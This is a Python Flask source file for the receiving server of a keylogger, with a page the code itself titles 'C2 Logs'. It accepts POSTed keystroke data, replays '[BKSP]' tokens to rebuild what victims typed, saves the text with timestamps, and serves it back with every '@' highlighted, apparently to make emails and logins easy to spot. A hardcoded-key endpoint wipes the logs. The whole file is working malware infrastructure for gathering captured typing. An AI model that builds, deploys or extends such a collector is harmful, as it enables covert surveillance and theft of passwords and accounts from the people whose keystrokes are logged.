from flask import Flask, request
import os
from datetime import datetime

app = Flask(__name__)

def process_backspaces(text):
    """Simulates real typing: [BKSP] removes the preceding character"""
    result = []
    i = 0
    while i < len(text):
        if text[i:i+6] == '[BKSP]':
            if result:
                result.pop()
            i += 6
        else:
            result.append(text[i])
            i += 1
    return ''.join(result)

@app.route('/logs', methods=['GET', 'POST'])
def handle_logs():
    if request.method == 'POST':
        data = request.get_data(as_text=True)
        if data:
            # Clean up backspaces before saving
            cleaned_data = process_backspaces(data)
            
            # Only save if there is actual content left after cleaning
            if cleaned_data.strip():
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                with open('logs.txt', 'a') as f:
                    f.write(f'[{timestamp}] {cleaned_data}\n')
            return 'OK', 200
        return 'Empty', 400
    
    # GET request - show logs with @ highlighting
    if os.path.exists('logs.txt'):
        with open('logs.txt', 'r') as f:
            raw_content = f.read()
        
        # Escape HTML special chars for safety
        safe_content = raw_content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        
        # Highlight every @ symbol in yellow
        highlighted = safe_content.replace('@', '<span style="background-color: #ffff00; color: #000; font-weight: bold; padding: 0 3px; border-radius: 3px;">@</span>')
        
        # Return as styled HTML page
        html_page = f"""<!DOCTYPE html>
<html>
<head>
    <title>C2 Logs</title>
    <style>
        body {{ background: #1a1a1a; color: #e0e0e0; font-family: 'Courier New', monospace; 
               padding: 20px; margin: 0; line-height: 1.8; word-wrap: break-word; }}
        pre {{ white-space: pre-wrap; margin: 0; font-size: 14px; }}
        .header {{ color: #666; font-size: 0.85em; margin-bottom: 8px; display: block; }}
    </style>
</head>
<body>
<pre>{highlighted}</pre>
</body>
</html>"""
        return html_page, 200
    
    return '<!DOCTYPE html><html><body style="background:#1a1a1a;color:#e0e0e0;font-family:monospace;padding:20px;">No logs yet</body></html>', 200

@app.route('/reset', methods=['GET'])
def reset_logs():
    key = request.args.get('key', '')
    if key != 'byebye':
        return 'Unauthorized', 403
    if os.path.exists('logs.txt'):
        open('logs.txt', 'w').close()
        return 'Logs cleared successfully', 200
    return 'No logs to clear', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
